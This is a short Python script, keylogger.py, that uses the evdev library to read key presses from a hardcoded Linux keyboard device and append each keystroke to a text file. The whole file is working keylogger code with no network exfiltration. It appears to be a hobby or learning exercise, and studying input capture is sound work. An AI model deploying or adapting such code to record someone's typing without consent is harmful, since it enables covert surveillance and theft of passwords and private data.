#!/usr/bin/python3
# keylogger.py

import evdev
from evdev import InputDevice
import signal

# Step 1: Create an empty file


def keylogger(filename, input_device):
    # Step 1: Open and read from the keyboard buffer
    # Read in a forever loop; the path to the buffer file is hardcoded
    # Read raw bytes using 'rb'
    # with open('/dev/input/by-path/platform-i8042-serio-0-event-kbd', 'rb') as keystrokes:
    #     while True:
    #         kbd_read = keystrokes.readline()
    #         print(kbd_read)

    device = InputDevice(input_device)
    # print(device)

    # text = ''

    for event in device.read_loop():

        # Filter out only those events for which the event is EV_KEY
        # to only filter for events where a key is pressed down use event.value == 1.
        # print(event)
        if event.type == evdev.ecodes.EV_KEY and event.value == 1:

            # print(evdev.categorize(event))

            event_info = evdev.categorize(event)
            keycode = event_info.keycode

            if "KEY_" in keycode:
                keycode = keycode.split("KEY_")
                key = keycode[1]

                if key == "SPACE":
                    key = " "
                else:
                    key = key.lower()

                write_to_file(filename, key)


# def parse_keystrokes(keycode):
#
#     if "KEY_" in keycode:
#         keycode = keycode.split("KEY_")
#         key = keycode[1]
#         # print(key)
#
#         if key == "SPACE":
#             key = " "
#         else:
#             key = key.lower()
#
#         write_to_file(key)


def write_to_file(filename, key):

    with open(filename, 'a') as f:
        f.write(key)
        # f.close()


def main():
    keylogger('test.txt', '/dev/input/by-path/platform-fd500000.pcie-pci-0000:01:00.0-usb-0:1.3:1.0-event-kbd')


if __name__ == "__main__":

    # signal.signal()
    main()
